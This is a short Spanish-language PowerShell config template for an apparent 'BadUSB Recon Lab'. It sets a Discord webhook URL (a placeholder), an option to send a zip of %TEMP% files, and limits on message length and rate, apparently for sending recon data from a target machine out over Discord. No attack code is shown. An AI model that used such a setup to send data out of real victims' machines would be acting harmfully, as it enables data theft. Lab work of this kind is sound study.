# ============================================================
# BadUSB Recon Lab — Configuración local
# ------------------------------------------------------------
# Copia este archivo como config.local.ps1 y rellena tus valores.
# config.local.ps1 está en .gitignore → nunca se subirá al repo.
# ============================================================

$Config = @{
    # URL del webhook de Discord (obligatorio)
    # Cómo obtenerla: Discord → Canal → Editar canal → Integraciones → Webhooks → Nuevo webhook → Copiar URL
    Webhook = "https://discord.com/api/webhooks/XXX/YYY"

    # Enviar también el zip de %TEMP% si existe (experimental, solo PS 7+)
    SendZip = $false

    # Ruta del zip a enviar (si SendZip = $true)
    ZipPath = "$env:TEMP\prueba.zip"

    # Límite de caracteres por mensaje (Discord: 2000, dejamos margen)
    MaxLen = 1900

    # Delay entre mensajes en ms (evita rate limit de Discord)
    DelayMs = 700
}